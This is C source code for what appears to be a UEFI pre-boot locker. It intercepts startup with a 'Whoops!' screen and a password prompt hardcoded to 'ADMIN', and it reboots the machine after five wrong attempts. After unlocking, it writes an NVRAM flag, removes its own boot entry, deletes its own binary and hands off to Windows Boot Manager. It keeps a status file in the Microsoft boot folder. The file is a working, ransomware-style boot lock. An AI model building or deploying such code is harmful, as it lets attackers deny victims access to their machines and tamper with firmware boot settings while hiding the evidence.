







static EFI_HANDLE gEFI_ImageHandle = NULL;

static EFI_GUID gCustomVariableGuid = { 0x12345678, 0x1234, 0x1234, {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0} };
static EFI_GUID gEfiLoadedImageProtocolGuid = { 0x5B1B31A1, 0x9562, 0x11D2, {0x8E, 0x3F, 0x00, 0xA0, 0xC9, 0x69, 0x72, 0x3B} };
static EFI_GUID gEfiSimpleFileSystemProtocolGuid = EFI_SIMPLE_FILE_SYSTEM_PROTOCOL_GUID;
static EFI_GUID gEfiGlobalVariableGuid = { 0x8BE4DF61, 0x93CA, 0x11d2, {0xAA, 0x0D, 0x00, 0xE0, 0x98, 0x03, 0x2B, 0x8C} };
static EFI_GUID gEfiDevicePathProtocolGuid = { 0x09576E91, 0x6D3F, 0x11d2, {0x8E, 0x39, 0x00, 0xA0, 0xC9, 0x69, 0x72, 0x3B} };
static EFI_GUID gEfiLoadedImageDevicePathProtocolGuid = { 0xBC62157E, 0x3E33, 0x4fec, {0x99, 0x20, 0x2D, 0x3B, 0x36, 0xD7, 0x50, 0xDF} };

typedef struct EFI_LOADED_IMAGE_PROTOCOL {
    UINT32 Revision;
    EFI_HANDLE ParentHandle;
    EFI_SYSTEM_TABLE* SystemTable;
    EFI_HANDLE DeviceHandle;
    EFI_DEVICE_PATH_PROTOCOL* FilePath;
    VOID* Reserved;
    UINT32 LoadOptionsSize;
    VOID* LoadOptions;
    VOID* ImageBase;
    UINT64 ImageSize;
    EFI_MEMORY_TYPE ImageCodeType;
    EFI_MEMORY_TYPE ImageDataType;
    EFI_STATUS(EFIAPI* Unload)(EFI_HANDLE ImageHandle);
} EFI_LOADED_IMAGE_PROTOCOL;

typedef struct {
    UINT32 Attributes;
    UINT16 FilePathListLength;
    CHAR16 Description[];
} EFI_LOAD_OPTION;

typedef struct {
    UINT8 Type;
    UINT8 SubType;
    UINT8 Length[2];
} EFI_DEVICE_PATH;

VOID MemClear(VOID* Buffer, UINTN Size);
VOID MemSet(VOID* Buffer, UINT8 Value, UINTN Size);
UINTN StrLen(CHAR16* Str);
CHAR16* StrStr(CHAR16* Haystack, CHAR16* Needle);
VOID* MyAllocatePool(EFI_BOOT_SERVICES* BootServices, UINTN Size);
VOID MyFreePool(EFI_BOOT_SERVICES* BootServices, VOID* Buffer);
BOOLEAN ReadFileFromEFI(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable, CHAR16* FilePath, CHAR16* Buffer, UINTN MaxLen);
BOOLEAN WriteFileToEFI(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable, CHAR16* FilePath, CHAR16* Buffer);
BOOLEAN ReadStatusFromFile(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable, CHAR16* StatusBuffer, UINTN MaxLen);
VOID ReadInput(EFI_SYSTEM_TABLE* SystemTable, CHAR16* Buffer, UINTN MaxLen);
BOOLEAN CompareStrings(CHAR16* Str1, CHAR16* Str2);
VOID UnicodeSPrint(CHAR16* Buffer, UINTN BufferSize, CHAR16* Format, UINT16 Value);
BOOLEAN CompareDevicePaths(EFI_DEVICE_PATH_PROTOCOL* Path1, EFI_DEVICE_PATH_PROTOCOL* Path2);
CHAR16* GetFileNameFromDevicePath(EFI_DEVICE_PATH_PROTOCOL* FilePath);
EFI_STATUS GetCurrentBootEntry(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable, UINT16* BootEntryNumber);
EFI_STATUS DeleteBootEntry(EFI_SYSTEM_TABLE* SystemTable, UINT16 BootEntryNumber);
EFI_STATUS GetWindowsBootManagerDevicePath(EFI_SYSTEM_TABLE* SystemTable, EFI_DEVICE_PATH_PROTOCOL** DevicePath, EFI_HANDLE* DeviceHandle);
EFI_STATUS LaunchWindowsBootManager(EFI_SYSTEM_TABLE* SystemTable);
EFI_STATUS DeleteSelf(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable);
UINTN DevicePathSize(EFI_DEVICE_PATH_PROTOCOL* DevicePath);

VOID MemClear(VOID* Buffer, UINTN Size) {
    volatile UINT8* B = (volatile UINT8*)Buffer;
    for (UINTN i = 0; i < Size; i++) {
        B[i] = 0;
    }
}

VOID MemSet(VOID* Buffer, UINT8 Value, UINTN Size) {
    volatile UINT8* B = (volatile UINT8*)Buffer;
    for (UINTN i = 0; i < Size; i++) {
        B[i] = Value;
    }
}

UINTN StrLen(CHAR16* Str) {
    UINTN Len = 0;
    while (*Str++) Len++;
    return Len;
}

CHAR16* StrStr(CHAR16* Haystack, CHAR16* Needle) {
    if (!Haystack || !Needle) return NULL;

    for (; *Haystack; Haystack++) {
        CHAR16* H = Haystack;
        CHAR16* N = Needle;

        while (*H && *N && (*H == *N)) {
            H++;
            N++;
        }

        if (!*N) return Haystack;
    }

    return NULL;
}

VOID* MyAllocatePool(EFI_BOOT_SERVICES* BootServices, UINTN Size) {
    EFI_STATUS Status;
    VOID* Buffer;

    Status = BootServices->AllocatePool(EfiLoaderData, Size, &Buffer);
    if (EFI_ERROR(Status)) {
        return NULL;
    }
    return Buffer;
}

VOID MyFreePool(EFI_BOOT_SERVICES* BootServices, VOID* Buffer) {
    if (Buffer) {
        BootServices->FreePool(Buffer);
    }
}

UINTN DevicePathSize(EFI_DEVICE_PATH_PROTOCOL* DevicePath) {
    UINTN Size = 0;
    while (!(DevicePath->Type == END_DEVICE_PATH_TYPE && DevicePath->SubType == END_ENTIRE_DEVICE_PATH_SUBTYPE)) {
        UINT16 NodeSize = *(UINT16*)((UINT8*)DevicePath + 2);
        Size += NodeSize;
        DevicePath = (EFI_DEVICE_PATH_PROTOCOL*)((UINT8*)DevicePath + NodeSize);
    }
    Size += sizeof(EFI_DEVICE_PATH_PROTOCOL);
    return Size;
}

BOOLEAN ReadFileFromEFI(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable, CHAR16* FilePath, CHAR16* Buffer, UINTN MaxLen) {
    EFI_LOADED_IMAGE_PROTOCOL* LoadedImage;
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL* fs;
    EFI_FILE_PROTOCOL* root;
    EFI_FILE_PROTOCOL* file;
    EFI_STATUS Status;
    UINTN BufferSize = MaxLen * sizeof(CHAR16);

    Status = SystemTable->BootServices->HandleProtocol(
        ImageHandle,
        &gEfiLoadedImageProtocolGuid,
        (void**)&LoadedImage
    );
    if (EFI_ERROR(Status)) return FALSE;

    Status = SystemTable->BootServices->HandleProtocol(
        LoadedImage->DeviceHandle,
        &gEfiSimpleFileSystemProtocolGuid,
        (void**)&fs
    );
    if (EFI_ERROR(Status)) return FALSE;

    Status = fs->OpenVolume(fs, &root);
    if (EFI_ERROR(Status)) return FALSE;

    Status = root->Open(root, &file, FilePath, EFI_FILE_MODE_READ, 0);
    if (EFI_ERROR(Status)) {
        root->Close(root);
        return FALSE;
    }

    MemClear(Buffer, MaxLen * sizeof(CHAR16));
    
    Status = file->Read(file, &BufferSize, Buffer);
    file->Close(file);
    root->Close(root);

    return !EFI_ERROR(Status);
}

BOOLEAN WriteFileToEFI(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable, CHAR16* FilePath, CHAR16* Buffer) {
    EFI_LOADED_IMAGE_PROTOCOL* LoadedImage;
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL* fs;
    EFI_FILE_PROTOCOL* root;
    EFI_FILE_PROTOCOL* file;
    EFI_STATUS Status;
    UINTN BufferSize = StrLen(Buffer) * sizeof(CHAR16);

    Status = SystemTable->BootServices->HandleProtocol(
        ImageHandle,
        &gEfiLoadedImageProtocolGuid,
        (void**)&LoadedImage
    );
    if (EFI_ERROR(Status)) return FALSE;

    Status = SystemTable->BootServices->HandleProtocol(
        LoadedImage->DeviceHandle,
        &gEfiSimpleFileSystemProtocolGuid,
        (void**)&fs
    );
    if (EFI_ERROR(Status)) return FALSE;

    Status = fs->OpenVolume(fs, &root);
    if (EFI_ERROR(Status)) return FALSE;

    Status = root->Open(root, &file, FilePath, EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE | EFI_FILE_MODE_CREATE, 0);
    if (EFI_ERROR(Status)) {
        root->Close(root);
        return FALSE;
    }

    Status = file->Write(file, &BufferSize, Buffer);
    file->Close(file);
    root->Close(root);

    return !EFI_ERROR(Status);
}

BOOLEAN ReadStatusFromFile(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable, CHAR16* StatusBuffer, UINTN MaxLen) {
    return ReadFileFromEFI(ImageHandle, SystemTable, (CHAR16*)L"\\EFI\\Microsoft\\Boot\\config\\status.txt", StatusBuffer, MaxLen);
}

VOID ReadInput(EFI_SYSTEM_TABLE* SystemTable, CHAR16* Buffer, UINTN MaxLen) {
    EFI_INPUT_KEY Key;
    UINTN Index;
    UINTN Pos = 0;

    MemClear(Buffer, MaxLen * sizeof(CHAR16));

    while (Pos < MaxLen - 1) {
        SystemTable->BootServices->WaitForEvent(1, &SystemTable->ConIn->WaitForKey, &Index);
        SystemTable->ConIn->ReadKeyStroke(SystemTable->ConIn, &Key);

        if (Key.UnicodeChar == '\r') break;
        else if (Key.UnicodeChar == '\b') {
            if (Pos > 0) {
                Pos--;
                Buffer[Pos] = 0;
                SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"\b \b");
            }
        }
        else if (Key.UnicodeChar >= ' ' && Key.UnicodeChar <= '~') {
            Buffer[Pos++] = Key.UnicodeChar;
            CHAR16 Out[2] = { Key.UnicodeChar, 0 };
            SystemTable->ConOut->OutputString(SystemTable->ConOut, Out);
        }
    }
    Buffer[Pos] = 0;
}

BOOLEAN CompareStrings(CHAR16* Str1, CHAR16* Str2) {
    if (!Str1 || !Str2) return FALSE;
    while (*Str1 && *Str2) {
        if (*Str1 != *Str2) return FALSE;
        Str1++;
        Str2++;
    }
    return (*Str1 == *Str2);
}

VOID UnicodeSPrint(CHAR16* Buffer, UINTN BufferSize, CHAR16* Format, UINT16 Value) {
    CHAR16* Dst = Buffer;
    CHAR16* Src = Format;

    while (*Src && (UINTN)((UINT8*)Dst - (UINT8*)Buffer) < BufferSize - sizeof(CHAR16)) {
        if (*Src == L'%' && *(Src + 1) == L'0' && *(Src + 2) == L'4' && *(Src + 3) == L'X') {
            Src += 4;
            CHAR16 Hex[5];
            CHAR16* HexPtr = Hex + 4;
            *HexPtr = 0;
            UINT16 Val = Value;
            for (int i = 3; i >= 0; i--) {
                UINT8 Digit = (Val >> (i * 4)) & 0xF;
                *(--HexPtr) = (Digit < 10) ? (L'0' + Digit) : (L'A' + Digit - 10);
            }
            for (int i = 0; i < 4 && (UINTN)((UINT8*)Dst - (UINT8*)Buffer) < BufferSize - sizeof(CHAR16); i++) {
                *Dst++ = HexPtr[i];
            }
        }
        else {
            *Dst++ = *Src++;
        }
    }
    *Dst = 0;
}

BOOLEAN CompareDevicePaths(EFI_DEVICE_PATH_PROTOCOL* Path1, EFI_DEVICE_PATH_PROTOCOL* Path2) {
    if (!Path1 || !Path2) return FALSE;

    UINT8* Ptr1 = (UINT8*)Path1;
    UINT8* Ptr2 = (UINT8*)Path2;

    while (1) {
        UINT8 Type1 = *Ptr1;
        UINT8 Type2 = *Ptr2;
        UINT8 SubType1 = *(Ptr1 + 1);
        UINT8 SubType2 = *(Ptr2 + 1);
        UINT16 Len1 = *(UINT16*)(Ptr1 + 2);
        UINT16 Len2 = *(UINT16*)(Ptr2 + 2);

        if (Type1 != Type2 || SubType1 != SubType2) return FALSE;
        if (Len1 != Len2) return FALSE;

        for (UINT16 i = 0; i < Len1; i++) {
            if (Ptr1[i] != Ptr2[i]) return FALSE;
        }

        if (Type1 == END_DEVICE_PATH_TYPE && SubType1 == END_ENTIRE_DEVICE_PATH_SUBTYPE) {
            break;
        }

        Ptr1 += Len1;
        Ptr2 += Len2;
    }

    return TRUE;
}

CHAR16* GetFileNameFromDevicePath(EFI_DEVICE_PATH_PROTOCOL* FilePath) {
    UINT8* Ptr = (UINT8*)FilePath;

    while (1) {
        UINT8 Type = *Ptr;
        UINT8 SubType = *(Ptr + 1);
        UINT16 Len = *(UINT16*)(Ptr + 2);

        if (Type == END_DEVICE_PATH_TYPE && SubType == END_ENTIRE_DEVICE_PATH_SUBTYPE) {
            break;
        }

        if (Type == MEDIA_DEVICE_PATH && SubType == MEDIA_FILEPATH_DP) {
            return (CHAR16*)(Ptr + 4);
        }

        Ptr += Len;
    }

    return NULL;
}

EFI_STATUS GetCurrentBootEntry(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable, UINT16* BootEntryNumber) {
    EFI_LOADED_IMAGE_PROTOCOL* LoadedImage;
    EFI_STATUS Status;
    UINT16* BootOrder;
    UINTN BootOrderSize;
    UINTN Index;

    Status = SystemTable->BootServices->HandleProtocol(
        ImageHandle,
        &gEfiLoadedImageProtocolGuid,
        (VOID**)&LoadedImage
    );
    if (EFI_ERROR(Status)) return Status;

    BootOrderSize = 0;
    Status = SystemTable->RuntimeServices->GetVariable(
        (CHAR16*)L"BootOrder",
        &gEfiGlobalVariableGuid,
        NULL,
        &BootOrderSize,
        NULL
    );
    if (Status != EFI_BUFFER_TOO_SMALL) return Status;

    BootOrder = (UINT16*)MyAllocatePool(SystemTable->BootServices, BootOrderSize);
    if (!BootOrder) return EFI_OUT_OF_RESOURCES;

    Status = SystemTable->RuntimeServices->GetVariable(
        (CHAR16*)L"BootOrder",
        &gEfiGlobalVariableGuid,
        NULL,
        &BootOrderSize,
        BootOrder
    );
    if (EFI_ERROR(Status)) {
        MyFreePool(SystemTable->BootServices, BootOrder);
        return Status;
    }

    for (Index = 0; Index < BootOrderSize / sizeof(UINT16); Index++) {
        UINT16 BootVar = BootOrder[Index];
        CHAR16 BootVarName[9];
        EFI_LOAD_OPTION* BootOption;
        UINTN BootVarSize;

        UnicodeSPrint(BootVarName, sizeof(BootVarName), (CHAR16*)L"Boot%04X", BootVar);

        BootVarSize = 0;
        Status = SystemTable->RuntimeServices->GetVariable(
            BootVarName,
            &gEfiGlobalVariableGuid,
            NULL,
            &BootVarSize,
            NULL
        );
        if (Status != EFI_BUFFER_TOO_SMALL) continue;

        BootOption = (EFI_LOAD_OPTION*)MyAllocatePool(SystemTable->BootServices, BootVarSize);
        if (!BootOption) continue;

        Status = SystemTable->RuntimeServices->GetVariable(
            BootVarName,
            &gEfiGlobalVariableGuid,
            NULL,
            &BootVarSize,
            BootOption
        );

        if (!EFI_ERROR(Status)) {
            UINT8* BootOptionPtr = (UINT8*)BootOption;
            UINTN DescLen = StrLen(BootOption->Description) + 1;
            EFI_DEVICE_PATH_PROTOCOL* OptionPath = (EFI_DEVICE_PATH_PROTOCOL*)(BootOptionPtr + sizeof(EFI_LOAD_OPTION) + (DescLen * sizeof(CHAR16)));

            if (CompareDevicePaths(LoadedImage->FilePath, OptionPath)) {
                *BootEntryNumber = BootVar;
                MyFreePool(SystemTable->BootServices, BootOption);
                MyFreePool(SystemTable->BootServices, BootOrder);
                return EFI_SUCCESS;
            }
        }

        MyFreePool(SystemTable->BootServices, BootOption);
    }

    MyFreePool(SystemTable->BootServices, BootOrder);
    return EFI_NOT_FOUND;
}

EFI_STATUS DeleteBootEntry(EFI_SYSTEM_TABLE* SystemTable, UINT16 BootEntryNumber) {
    CHAR16 BootVarName[9];
    EFI_STATUS Status;
    UINT16* BootOrder;
    UINTN BootOrderSize;
    UINTN Index;

    UnicodeSPrint(BootVarName, sizeof(BootVarName), (CHAR16*)L"Boot%04X", BootEntryNumber);

    Status = SystemTable->RuntimeServices->SetVariable(
        BootVarName,
        &gEfiGlobalVariableGuid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
        0,
        NULL
    );

    if (EFI_ERROR(Status)) return Status;

    BootOrderSize = 0;
    Status = SystemTable->RuntimeServices->GetVariable(
        (CHAR16*)L"BootOrder",
        &gEfiGlobalVariableGuid,
        NULL,
        &BootOrderSize,
        NULL
    );
    if (Status != EFI_BUFFER_TOO_SMALL) return Status;

    BootOrder = (UINT16*)MyAllocatePool(SystemTable->BootServices, BootOrderSize);
    if (!BootOrder) return EFI_OUT_OF_RESOURCES;

    Status = SystemTable->RuntimeServices->GetVariable(
        (CHAR16*)L"BootOrder",
        &gEfiGlobalVariableGuid,
        NULL,
        &BootOrderSize,
        BootOrder
    );
    if (EFI_ERROR(Status)) {
        MyFreePool(SystemTable->BootServices, BootOrder);
        return Status;
    }

    UINTN NewEntryCount = 0;
    for (Index = 0; Index < BootOrderSize / sizeof(UINT16); Index++) {
        if (BootOrder[Index] != BootEntryNumber) {
            NewEntryCount++;
        }
    }

    if (NewEntryCount > 0) {
        UINT16* NewBootOrder = (UINT16*)MyAllocatePool(SystemTable->BootServices, NewEntryCount * sizeof(UINT16));
        if (NewBootOrder) {
            UINTN NewIndex = 0;
            for (Index = 0; Index < BootOrderSize / sizeof(UINT16); Index++) {
                if (BootOrder[Index] != BootEntryNumber) {
                    NewBootOrder[NewIndex++] = BootOrder[Index];
                }
            }

            Status = SystemTable->RuntimeServices->SetVariable(
                (CHAR16*)L"BootOrder",
                &gEfiGlobalVariableGuid,
                EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
                NewEntryCount * sizeof(UINT16),
                NewBootOrder
            );

            MyFreePool(SystemTable->BootServices, NewBootOrder);
        }
    }
    else {
        Status = SystemTable->RuntimeServices->SetVariable(
            (CHAR16*)L"BootOrder",
            &gEfiGlobalVariableGuid,
            EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
            0,
            NULL
        );
    }

    MyFreePool(SystemTable->BootServices, BootOrder);
    return Status;
}

EFI_STATUS GetWindowsBootManagerDevicePath(EFI_SYSTEM_TABLE* SystemTable, EFI_DEVICE_PATH_PROTOCOL** DevicePath, EFI_HANDLE* DeviceHandle) {
    UINT16* BootOrder;
    UINTN BootOrderSize;
    UINTN Index;
    EFI_STATUS Status;

    *DevicePath = NULL;
    *DeviceHandle = NULL;

    BootOrderSize = 0;
    Status = SystemTable->RuntimeServices->GetVariable(
        (CHAR16*)L"BootOrder",
        &gEfiGlobalVariableGuid,
        NULL,
        &BootOrderSize,
        NULL
    );
    if (Status != EFI_BUFFER_TOO_SMALL) return Status;

    BootOrder = (UINT16*)MyAllocatePool(SystemTable->BootServices, BootOrderSize);
    if (!BootOrder) return EFI_OUT_OF_RESOURCES;

    Status = SystemTable->RuntimeServices->GetVariable(
        (CHAR16*)L"BootOrder",
        &gEfiGlobalVariableGuid,
        NULL,
        &BootOrderSize,
        BootOrder
    );
    if (EFI_ERROR(Status)) {
        MyFreePool(SystemTable->BootServices, BootOrder);
        return Status;
    }

    for (Index = 0; Index < BootOrderSize / sizeof(UINT16); Index++) {
        UINT16 BootVar = BootOrder[Index];
        CHAR16 BootVarName[9];
        EFI_LOAD_OPTION* BootOption;
        UINTN BootVarSize;

        UnicodeSPrint(BootVarName, sizeof(BootVarName), (CHAR16*)L"Boot%04X", BootVar);

        BootVarSize = 0;
        Status = SystemTable->RuntimeServices->GetVariable(
            BootVarName,
            &gEfiGlobalVariableGuid,
            NULL,
            &BootVarSize,
            NULL
        );
        if (Status != EFI_BUFFER_TOO_SMALL) continue;

        BootOption = (EFI_LOAD_OPTION*)MyAllocatePool(SystemTable->BootServices, BootVarSize);
        if (!BootOption) continue;

        Status = SystemTable->RuntimeServices->GetVariable(
            BootVarName,
            &gEfiGlobalVariableGuid,
            NULL,
            &BootVarSize,
            BootOption
        );

        if (!EFI_ERROR(Status)) {
            if (StrStr(BootOption->Description, (CHAR16*)L"Windows Boot Manager") != NULL) {
                UINT8* BootOptionPtr = (UINT8*)BootOption;
                UINTN DescLen = StrLen(BootOption->Description) + 1;
                EFI_DEVICE_PATH_PROTOCOL* SourcePath = (EFI_DEVICE_PATH_PROTOCOL*)(BootOptionPtr + sizeof(EFI_LOAD_OPTION) + (DescLen * sizeof(CHAR16)));

                UINTN PathSize = DevicePathSize(SourcePath);
                *DevicePath = (EFI_DEVICE_PATH_PROTOCOL*)MyAllocatePool(SystemTable->BootServices, PathSize);
                if (*DevicePath) {
                    SystemTable->BootServices->CopyMem(*DevicePath, SourcePath, PathSize);
                    
                    EFI_DEVICE_PATH_PROTOCOL* TempPath = *DevicePath;
                    Status = SystemTable->BootServices->LocateDevicePath(&gEfiSimpleFileSystemProtocolGuid, &TempPath, DeviceHandle);
                    if (EFI_ERROR(Status)) {
                        Status = SystemTable->BootServices->LocateDevicePath(&gEfiDevicePathProtocolGuid, &TempPath, DeviceHandle);
                    }
                }

                MyFreePool(SystemTable->BootServices, BootOption);
                MyFreePool(SystemTable->BootServices, BootOrder);
                return EFI_SUCCESS;
            }
        }

        MyFreePool(SystemTable->BootServices, BootOption);
    }

    MyFreePool(SystemTable->BootServices, BootOrder);
    return EFI_NOT_FOUND;
}

EFI_STATUS LaunchWindowsBootManager(EFI_SYSTEM_TABLE* SystemTable) {
    EFI_DEVICE_PATH_PROTOCOL* DevicePath;
    EFI_HANDLE DeviceHandle;
    EFI_STATUS Status;
    EFI_HANDLE ImageHandle;

    Status = GetWindowsBootManagerDevicePath(SystemTable, &DevicePath, &DeviceHandle);
    if (EFI_ERROR(Status)) {
        return Status;
    }

    Status = SystemTable->BootServices->LoadImage(
        FALSE,
        gEFI_ImageHandle,
        DevicePath,
        NULL,
        0,
        &ImageHandle
    );

    if (EFI_ERROR(Status)) {
        MyFreePool(SystemTable->BootServices, DevicePath);
        return Status;
    }

    Status = SystemTable->BootServices->StartImage(ImageHandle, NULL, NULL);

    MyFreePool(SystemTable->BootServices, DevicePath);
    return Status;
}

EFI_STATUS DeleteSelf(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable) {
    EFI_LOADED_IMAGE_PROTOCOL* LoadedImage;
    EFI_STATUS Status;
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL* FileSystem;
    EFI_FILE_PROTOCOL* Root;
    EFI_FILE_PROTOCOL* FileHandle;
    CHAR16* FileName;

    Status = SystemTable->BootServices->HandleProtocol(
        ImageHandle,
        &gEfiLoadedImageProtocolGuid,
        (VOID**)&LoadedImage
    );
    if (EFI_ERROR(Status)) return Status;

    Status = SystemTable->BootServices->HandleProtocol(
        LoadedImage->DeviceHandle,
        &gEfiSimpleFileSystemProtocolGuid,
        (VOID**)&FileSystem
    );
    if (EFI_ERROR(Status)) return Status;

    Status = FileSystem->OpenVolume(FileSystem, &Root);
    if (EFI_ERROR(Status)) return Status;

    FileName = GetFileNameFromDevicePath(LoadedImage->FilePath);
    if (!FileName) {
        Root->Close(Root);
        return EFI_NOT_FOUND;
    }

    Status = Root->Open(Root, &FileHandle, FileName, EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
    if (EFI_ERROR(Status)) {
        Root->Close(Root);
        return Status;
    }

    Status = FileHandle->Delete(FileHandle);
    Root->Close(Root);

    return Status;
}

EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable) {
    gEFI_ImageHandle = ImageHandle;
    
    SystemTable->ConOut->ClearScreen(SystemTable->ConOut);

    UINT64 UnlockedFlag = 0;
    UINTN DataSize = sizeof(UnlockedFlag);
    EFI_STATUS Status = SystemTable->RuntimeServices->GetVariable(
        (CHAR16*)L"UnlockedFlag", &gCustomVariableGuid, NULL, &DataSize, &UnlockedFlag);

    if (Status == EFI_SUCCESS && UnlockedFlag == 1) {
        SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"Already unlocked. Launching Windows Boot Manager...\r\n");
        SystemTable->BootServices->Stall(2000000);

        Status = LaunchWindowsBootManager(SystemTable);
        if (!EFI_ERROR(Status)) {
            return EFI_SUCCESS;
        }

        SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"Failed to launch Windows Boot Manager. Resetting system...\r\n");
        SystemTable->BootServices->Stall(2000000);
        SystemTable->RuntimeServices->ResetSystem(EfiResetCold, EFI_SUCCESS, 0, NULL);
    }

    static CHAR16 StatusText[16]; 
    static CHAR16 AdminPassword[] = { 'A','D','M','I','N', 0 };

    MemClear(StatusText, sizeof(StatusText));

    ReadStatusFromFile(ImageHandle, SystemTable, StatusText, 16);

    SystemTable->ConOut->SetCursorPosition(SystemTable->ConOut, 0, 0);
    SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"==================================================\r\n");
    SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"                test                 \r\n");
    SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"====================================\r\n");
    SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"\r\n");
    SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"\r\n");
    SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"\r\n");
    SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"\r\n");

    SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"Whoops! ");
    if (CompareStrings(StatusText, (CHAR16*)L"FULL")) {
        SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"works perfectly\r\n");
    }
    else {
        SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"works\r\n");
    }
    SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"\r\n");

    BOOLEAN AdminUnlocked = FALSE;
    UINTN AdminAttempts = 0;
    UINTN MaxAdminAttempts = 5;
    static CHAR16 InputKey[65];

    SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"========== login ==========\r\n");
    SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"\r\n");

    while (!AdminUnlocked && AdminAttempts < MaxAdminAttempts) {
        MemClear(InputKey, sizeof(InputKey));
        SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"Registry Password: ");
        ReadInput(SystemTable, InputKey, 64);
        SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"\r\n");

        if (CompareStrings(InputKey, AdminPassword)) {
            AdminUnlocked = TRUE;
            SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"\r\n");
            SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"success\r\n");
            SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"\r\n");
        }
        else {
            AdminAttempts++;
            SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"invalid\r\n");
            if (AdminAttempts < MaxAdminAttempts) {
                SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"Attempts remaining: ");
                CHAR16 Num[2] = { 0 };
                Num[0] = '0' + (MaxAdminAttempts - AdminAttempts);
                SystemTable->ConOut->OutputString(SystemTable->ConOut, Num);
                SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"\r\n\r\n");
            }
            else {
                SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"\r\n");
                SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"Too many failed admin attempts. System will reboot in 5 seconds...\r\n");
                SystemTable->BootServices->Stall(5000000);
                SystemTable->RuntimeServices->ResetSystem(EfiResetCold, EFI_SUCCESS, 0, NULL);
            }
        }
    }

    if (!AdminUnlocked) {
        return EFI_SUCCESS;
    }

    SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"Access granted.\r\n");
    SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"...\r\n");

    UINT64 Flag = 1;
    SystemTable->RuntimeServices->SetVariable(
        (CHAR16*)L"UnlockedFlag", &gCustomVariableGuid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
        sizeof(Flag), &Flag);

    SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"\r\nCleaning up...\r\n");

    UINT16 BootEntryNumber;
    EFI_STATUS CleanupStatus = GetCurrentBootEntry(ImageHandle, SystemTable, &BootEntryNumber);
    if (!EFI_ERROR(CleanupStatus)) {
        SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"Removing boot entry...\r\n");
        CleanupStatus = DeleteBootEntry(SystemTable, BootEntryNumber);
        if (!EFI_ERROR(CleanupStatus)) {
            SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"Boot entry removed.\r\n");
        }
    }

    SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"Removing uefi...\r\n");
    CleanupStatus = DeleteSelf(ImageHandle, SystemTable);
    if (!EFI_ERROR(CleanupStatus)) {
        SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"Uefi removed.\r\n");
    }

    SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"Launching Windows Boot Manager...\r\n");
    SystemTable->BootServices->Stall(2000000);

    Status = LaunchWindowsBootManager(SystemTable);
    if (EFI_ERROR(Status)) {
        SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"Failed to launch Windows Boot Manager. Rebooting...\r\n");
        SystemTable->BootServices->Stall(3000000);
        SystemTable->RuntimeServices->ResetSystem(EfiResetCold, EFI_SUCCESS, 0, NULL);
    }

    return EFI_SUCCESS;
}
